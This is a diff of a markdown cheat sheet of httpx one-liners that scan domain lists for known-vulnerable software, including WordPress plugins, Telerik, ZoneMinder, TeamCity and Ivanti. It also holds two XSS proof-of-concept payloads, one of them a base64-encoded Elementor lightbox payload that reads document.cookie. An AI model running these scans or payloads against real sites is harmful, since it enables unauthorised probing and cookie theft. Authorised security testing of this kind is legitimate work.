@@ -47,28 +47,27 @@
 ## wordpressXss:
     cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200
 
-## Telerik_RCE(CVE-2017-11317)
+## CVE-2017-11317-Telerik
     cat subs.txt | httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '"RadAsyncUpload handler is registered succesfully' -t 200 -o telerik2.txt
     
-## zoneminder_RCE CVE-2023-26035
+## CVE-2023-26035-zoneminder
     cat alldomains.txt | httpx -path "/index.php" -ms 'name="__csrf_magic"' -t 200 -o CVE-2023-26035.txt
 
-## CVE-2023-38388
+## CVE-2023-38388-jupiterx
     cat privates/domainsroot.txt | httpx -path "/wp-content/plugins/jupiterx-core/readme.txt" -ms "Jupiter X Core" -o jupiter.txt
 
-## CVE-2023-4596
+## CVE-2023-4596-forminator
     cat bugbounty/subs.txt | httpx -path '/wp-content/plugins/forminator/readme.txt' -ms  "Stable tag: 1\.([0-2][0-9]|3[0-6])\.[0-9]+" -o "forminator.txt"
 
-## fusion-CVE-2022-1386.txt
+## CVE-2022-1386-fusion-builder
     cat alldomains.txt | httpx -path "/wp-content/plugins/fusion-builder/readme.txt" -ms "Builder =" -o fusion-CVE-2022-1386.txt
     
-## TeamCity
+## CVE-2023-42793-TeamCity
     cat alldomains.txt | httpx -path "/login.html" -ms "log in to teamcity" -o teamcity.txt
 
-## CVE-2023-35078
+## CVE-2023-35078-Ivanti
     cat alldomains.txt | httpx -ms "ui.login.css?" -o CVE-2023-35078.txt
-
-    /wp-content/plugins/forminator/readme.txt
+    
 ## Elementor Xss
     cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -mr "(?i)Stable tag: (3\.[0-5]\.[0-5]\d*)" -o elementor.txt -t 200
     www.target.com/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
